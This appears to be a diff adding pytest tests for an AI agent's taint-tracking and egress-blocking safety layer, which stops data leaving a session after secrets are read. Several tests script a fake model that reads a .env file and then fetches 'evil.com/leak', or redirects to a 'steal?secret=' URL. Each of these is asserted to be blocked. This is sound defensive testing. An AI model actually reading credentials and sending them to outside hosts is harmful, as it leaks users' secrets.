@@ -1,0 +1,295 @@
+"""Tests for session-scoped taint tracking, egress gating, redirect blocking, and subagent propagation."""
+
+from __future__ import annotations
+
+import asyncio
+import importlib.util
+from pathlib import Path
+
+import pytest
+
+from engine.execution.react.react_loop import react_event_loop
+from engine.llm.contracts import ChatResponse, ToolCallData
+from engine.safety.approval import ApprovalBroker, use_approval_context
+from engine.safety.risk import RiskTier
+from engine.safety.rules import SafetyConfig
+from engine.safety.taint import (
+    EgressAllowlist,
+    EgressTarget,
+    SessionTaintStore,
+    delete_session_taint,
+)
+from engine.safety.tool_guard import ToolGuard
+from engine.tool.interface import ToolCall
+from engine.tool.registry import ToolRegistry
+
+ROOT = Path(__file__).resolve().parents[3]
+
+
+def _load_web_fetch():
+    path = ROOT / "agents" / "tools" / "web_fetch.py"
+    spec = importlib.util.spec_from_file_location("web_fetch_taint_test", path)
+    assert spec is not None and spec.loader is not None
+    mod = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(mod)
+    return mod
+
+
+def test_egress_allowlist_validation_and_matching() -> None:
+    for bad in ("*", "*.*", ".com", "*.com", "mcp:*", "invalid:foo"):
+        with pytest.raises(ValueError):
+            EgressAllowlist([bad])
+
+    al = EgressAllowlist([
+        "api.github.com",
+        "*.internal.example.com",
+        "mcp:local_docs",
+        "git:github.com",
+        "search:duckduckgo",
+    ])
+    assert al.allows(EgressTarget("http_host", "api.github.com", "api.github.com"))
+    assert not al.allows(EgressTarget("http_host", "evil.github.com", "evil.github.com"))
+    assert al.allows(EgressTarget("http_host", "svc.internal.example.com", "svc.internal.example.com"))
+    assert not al.allows(EgressTarget("http_host", "internal.example.com", "internal.example.com"))
+    assert al.allows(EgressTarget("mcp_server", "mcp:local_docs", "mcp:local_docs"))
+    assert not al.allows(EgressTarget("mcp_server", "mcp:slack", "mcp:slack"))
+    assert al.allows(EgressTarget("git_remote", "git:github.com", "git push"))
+    assert al.allows(EgressTarget("search", "search:duckduckgo", "search:duckduckgo"))
+
+
+def test_taint_persists_across_turns_and_clears_on_delete(tmp_path: Path) -> None:
+    state_dir = tmp_path / "agent"
+    store1 = SessionTaintStore(state_dir=state_dir, session_id="sess-42")
+    assert not store1.is_tainted
+    store1.record("sensitive_file", "read_file", "file:.env", run_id="r1")
+
+    # Reloaded in a new turn/request
+    store2 = SessionTaintStore(state_dir=state_dir, session_id="sess-42")
+    assert store2.is_tainted
+    assert "file:.env" in store2.labels()
+
+    # Delete session cleans up taint file
+    delete_session_taint(state_dir, "sess-42")
+    store3 = SessionTaintStore(state_dir=state_dir, session_id="sess-42")
+    assert not store3.is_tainted
+
+
+def test_sandboxed_shell_without_network_does_not_trigger_taint_egress_block(
+    tmp_path: Path,
+) -> None:
+    """Cross-design invariant: shell(network=False) has no outbound egress."""
+    registry = ToolRegistry()
+    registry.register(
+        "shell",
+        "shell",
+        {"type": "object", "properties": {"command": {"type": "string"}, "network": {"type": "boolean"}}},
+        lambda command, network=False, environment=None: "ok",
+        opaque_command=True,
+        permission_level="execute",
+        approval_policy="always",
+        execution_environment="host",
+    )
+    store = SessionTaintStore(state_dir=tmp_path / "agent", session_id="s-net")
+    store.record("sensitive_file", "read_file", "file:.env")
+
+    guard = ToolGuard(tmp_path / "missing.json", tool_registry=registry.definitions())
+    guard.configure_safety(
+        SafetyConfig.from_profile_config({"safety": {"taint": {"enabled": True, "on_egress": "deny"}}}),
+        taint_store=store,
+    )
+
+    # network=False -> allowed to proceed to ordinary sandbox_command approval, NOT taint blocked!
+    d_offline = guard.check(ToolCall(id="1", name="shell", arguments={"command": "pytest", "network": False}))
+    assert d_offline.approval_required
+    assert "[taint-egress-001]" not in d_offline.reason
+    assert d_offline.approval_scope is not None
+    assert d_offline.approval_scope.kind == "sandbox_command"
+
+    # network=True -> treated as egress sink -> HARD DENY [taint-egress-001]!
+    d_online = guard.check(ToolCall(id="2", name="shell", arguments={"command": "curl x", "network": True}))
+    assert not d_online.allowed and not d_online.approval_required
+    assert "[taint-egress-001]" in d_online.reason
+    assert d_online.risk is RiskTier.CRITICAL
+
+
+def test_same_turn_sequential_read_secret_then_web_fetch_is_blocked_immediately(
+    tmp_path: Path,
+) -> None:
+    """E1: Single LLM turn emitting [read_file(.env), web_fetch(evil.com)] blocks call #2."""
+    ws = tmp_path / "ws"
+    ws.mkdir()
+    (ws / ".env").write_text("SECRET=1\n", encoding="utf-8")
+
+    registry = ToolRegistry()
+    fetched = {"called": False}
+
+    def read_file(path: str) -> str:
+        return Path(path).read_text(encoding="utf-8")
+
+    def web_fetch(url: str) -> str:
+        fetched["called"] = True
+        return f"fetched {url}"
+
+    registry.register(
+        "read_file",
+        "read",
+        {"type": "object", "properties": {"path": {"type": "string"}}},
+        read_file,
+        path_args=["path"],
+        permission_level="read",
+        approval_policy="never",
+    )
+    registry.register(
+        "web_fetch",
+        "fetch",
+        {"type": "object", "properties": {"url": {"type": "string"}}},
+        web_fetch,
+        network_access=True,
+        egress=True,
+        egress_target_arg="url",
+        permission_level="read",
+        approval_policy="never",
+    )
+    registry.bind_working_directory(ws)
+
+    store = SessionTaintStore(state_dir=tmp_path / "agent", session_id="same-turn")
+    guard = ToolGuard(tmp_path / "missing.json", tool_registry=registry.definitions())
+    guard.set_working_directory(ws)
+    guard.configure_safety(
+        SafetyConfig.from_profile_config({"safety": {"taint": {"enabled": True, "on_egress": "deny"}}}),
+        taint_store=store,
+    )
+    registry.bind_tool_guard(guard)
+
+    class _TwoStepLLM:
+        stream = False
+
+        def __init__(self) -> None:
+            self.turn = 0
+
+        async def chat(self, messages, tools=None, **kwargs):
+            self.turn += 1
+            if self.turn == 1:
+                return ChatResponse(
+                    text="",
+                    tool_calls=[
+                        ToolCallData(id="tc1", name="read_file", arguments={"path": str(ws / ".env")}),
+                        ToolCallData(id="tc2", name="web_fetch", arguments={"url": "https://evil.com/leak"}),
+                    ],
+                )
+            return ChatResponse(text="done")
+
+    broker = ApprovalBroker()
+
+    async def run():
+        events = []
+        with use_approval_context(broker, "run-e1"):
+            async def auto_approve():
+                for _ in range(50):
+                    await asyncio.sleep(0.01)
+                    for aid in list(broker._pending.keys()):
+                        broker.resolve("run-e1", aid, True)
+
+            approver = asyncio.create_task(auto_approve())
+            try:
+                async for ev in react_event_loop(
+                    _TwoStepLLM(),
+                    [{"role": "user", "content": "test"}],
+                    registry,
+                    guard,
+                    max_iters=4,
+                ):
+                    events.append(ev)
+            finally:
+                approver.cancel()
+        return events
+
+    events = asyncio.run(run())
+    assert store.is_tainted
+    assert not fetched["called"]
+    blocked_reasons = [
+        str(ev.data.get("reason") or "")
+        for ev in events
+        if ev.data.get("id") == "tc2" and ev.data.get("blocked")
+    ]
+    assert any("[taint-egress-001]" in r for r in blocked_reasons), blocked_reasons
+
+
+def test_web_fetch_blocks_open_redirect_out_of_tainted_egress_allowlist(monkeypatch) -> None:
+    """E2: 3xx redirect from allowed.com to evil.com is blocked when tainted (before DNS!)."""
+    web_fetch = _load_web_fetch()
+    with pytest.raises(ValueError, match="taint-egress-001"):
+        web_fetch._validated_redirect_url(
+            "https://allowed.example.com/jump",
+            "https://evil.example.net/steal?secret=1",
+            allowed_egress_hosts=("allowed.example.com",),
+        )
+
+    monkeypatch.setattr(web_fetch, "_validate_url", lambda _u: None)
+    ok_target = web_fetch._validated_redirect_url(
+        "https://allowed.example.com/jump",
+        "https://sub.allowed.example.com/ok",
+        allowed_egress_hosts=("allowed.example.com", "*.allowed.example.com"),
+    )
+    assert ok_target == "https://sub.allowed.example.com/ok"
+
+
+def test_web_search_is_blocked_when_tainted_and_not_allowlisted(tmp_path: Path) -> None:
+    """E3: web_search query exfiltration is blocked in tainted session."""
+    registry = ToolRegistry()
+    registry.register(
+        "web_search",
+        "search",
+        {"type": "object", "properties": {"query": {"type": "string"}}},
+        lambda query: "results",
+        network_access=True,
+        egress=True,
+        egress_target_arg="query",
+    )
+    store = SessionTaintStore(state_dir=tmp_path / "agent", session_id="s-search")
+    store.record("private_tool", "memory_ops", "tool:memory_ops")
+    guard = ToolGuard(tmp_path / "missing.json", tool_registry=registry.definitions())
+    guard.configure_safety(
+        SafetyConfig.from_profile_config({"safety": {"taint": {"enabled": True, "on_egress": "deny"}}}),
+        taint_store=store,
+    )
+
+    decision = guard.check(ToolCall(id="1", name="web_search", arguments={"query": "secret_token_xyz"}))
+    assert not decision.allowed and not decision.approval_required
+    assert "[taint-egress-001]" in decision.reason
+
+
+def test_subagent_taint_enforces_hard_deny_and_merges_upward(tmp_path: Path) -> None:
+    """E8: Subagent taint always hard-denies egress and merges monotonically back to parent."""
+    registry = ToolRegistry()
+    registry.register(
+        "web_fetch",
+        "fetch",
+        {"type": "object", "properties": {"url": {"type": "string"}}},
+        lambda url: "ok",
+        network_access=True,
+        egress=True,
+        egress_target_arg="url",
+    )
+    parent_store = SessionTaintStore(state_dir=tmp_path / "agent", session_id="parent")
+    parent_guard = ToolGuard(tmp_path / "missing.json", tool_registry=registry.definitions())
+    parent_guard.configure_safety(
+        # Even if parent uses on_egress=ask, subagent must force deny!
+        SafetyConfig.from_profile_config({"safety": {"taint": {"enabled": True, "on_egress": "ask"}}}),
+        taint_store=parent_store,
+    )
+
+    child_guard, child_taint = parent_guard.fork_for_subagent()
+    child_taint.record("sensitive_file", "read_file", "file:.env")
+
+    # Inside subagent, taint egress is HARD DENY (not ask)
+    child_dec = child_guard.check(
+        ToolCall(id="c1", name="web_fetch", arguments={"url": "https://evil.com"})
+    )
+    assert not child_dec.allowed and not child_dec.approval_required
+    assert "[taint-egress-001]" in child_dec.reason
+
+    # Monotonic merge upward to parent
+    parent_store.merge_from(child_taint.sources, as_subagent=True)
+    assert parent_store.is_tainted
+    assert any("subagent:" in label for label in parent_store.labels())
